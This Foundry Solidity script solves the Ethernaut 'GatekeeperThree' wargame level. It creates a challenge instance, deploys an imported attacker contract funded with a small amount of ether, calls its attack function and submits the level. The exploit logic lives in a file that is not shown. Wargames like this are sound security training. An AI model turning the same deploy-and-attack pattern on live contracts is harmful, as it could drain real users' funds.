// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import "../../src/28-GatekeeperThreeAttacker.sol";

contract GatekeeperThreeSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x653239b3b3E67BC0ec1Df7835DA2d38761FfD882;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        GatekeeperThreeAttacker gatekeeperThreeAttacker = new GatekeeperThreeAttacker{value: 0.0011 ether}(challengeInstance);
        gatekeeperThreeAttacker.attack();

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(28));
    }
}
